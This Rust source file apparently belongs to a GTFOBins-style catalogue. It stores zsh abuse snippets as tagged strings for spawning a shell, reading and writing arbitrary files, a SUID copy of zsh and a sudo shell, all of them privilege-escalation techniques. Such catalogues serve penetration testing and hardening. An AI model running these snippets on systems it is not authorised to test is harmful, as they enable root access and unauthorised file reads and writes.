use crate::code::{Code, Tag};
pub static BIN_NAME: &'static str = "zsh";
static SH_CODE: &'static str = r#"
    
    zsh
"#;
static FW_CODE: &'static str = r#"
    
    export LFILE=file_to_write
    zsh -c 'echo DATA >$LFILE'
"#;
static FR_CODE: &'static str = r#"
    
    export LFILE=file_to_read
    zsh -c 'echo "$(<$LFILE)"'
"#;
static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which zsh) .

    ./zsh
"#;
static SUDO_CODE: &'static str = r#"
    
    sudo zsh
"#;

pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};

pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
